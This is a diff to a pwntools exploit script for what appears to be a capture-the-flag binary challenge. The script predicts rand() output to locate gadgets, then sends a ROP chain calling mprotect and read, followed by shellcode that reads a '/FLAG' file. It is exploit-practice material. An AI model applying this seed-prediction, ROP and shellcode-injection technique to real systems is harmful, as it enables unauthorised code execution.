@@ -29,9 +29,6 @@ time = int(r.recvuntil('\n', drop=True))
 print("time: ", time)
 r.recvuntil('** Random bytes generated at ')
 base_addr = int(r.recvuntil('\n', drop=True), 16)
-# r.recvuntil(b'is 60 second(s)\n')
-
-# print("base addr: ", base_addr)
 
 # feed seed
 libc.srand(time)
@@ -40,22 +37,22 @@ LEN_CODE = 10*0x10000
 codeint = b''
 for i in range(LEN_CODE//4):
     codeint += (((libc.rand()<<16) | (libc.rand() & 0xffff)) & 0xffff).to_bytes(4, "little")
-# print(codeint)
 syscall_at = libc.rand() % (LEN_CODE//4-1)
 # codeint[libc.rand() % (LEN_CODE/4-1)] = 0xc3050f
 
 
-wait_to_send = b''
-pop_rax = p64(codeint.find(asm("pop rax\nret"))+base_addr) # (b'X\xc3')
+pop_rax = p64(codeint.find(asm("pop rax\nret"))+base_addr) # b'X\xc3'
 pop_rdi = p64(codeint.find(asm("pop rdi\nret"))+base_addr)
 pop_rsi = p64(codeint.find(asm("pop rsi\nret"))+base_addr)
 pop_rdx = p64(codeint.find(asm("pop rdx\nret"))+base_addr)
 syscall = p64(syscall_at*4 + base_addr)
 # base_addr = base_addr & 0xfffffffffffff000 + 0x1000
 bb = base_addr
-shm_addr = base_addr + 0x30
-code_addr = p64(base_addr+0x100)
 base_addr = p64(base_addr)
+code_addr = p64(bb+0x100)
+
+
+wait_to_send = b''
 
 # mprotect
 wait_to_send += pop_rax 
@@ -68,7 +65,7 @@ wait_to_send += pop_rdx
 wait_to_send += p64(7)
 wait_to_send += syscall
 
-# read data
+# read data -> for task1: "/FLAG"
 wait_to_send += pop_rax
 wait_to_send += p64(0)
 wait_to_send += pop_rdi
@@ -79,7 +76,7 @@ wait_to_send += pop_rdx
 wait_to_send += p64(50)
 wait_to_send += syscall
 
-# read code
+# read asm code -> to achieve the tasks
 wait_to_send += pop_rax
 wait_to_send += p64(0)
 wait_to_send += pop_rdi
@@ -113,11 +110,7 @@ wait_to_send += syscall
 
 r.send(wait_to_send)
 
-# r.send(asm("mov rax,60;mov rdi,34;syscall"))
-# # print("send:", asm("mov rax,60;mov rdi,34;syscall"))
-# codes = asm("mov rax,60;mov rdi,34;syscall")
-
-# task1 data
+# task1 data, "/FLAG"
 data = p64(0x47414c462f) + p64(0)
 r.send(data)
  
@@ -196,6 +189,7 @@ mov rdi, 37
 mov rax, 60
 syscall
 """.format(bb, bb, bb+0x30, bb+0x30)
+# shm_addr = bb + 0x30
 
 r.send(asm(codes))
 
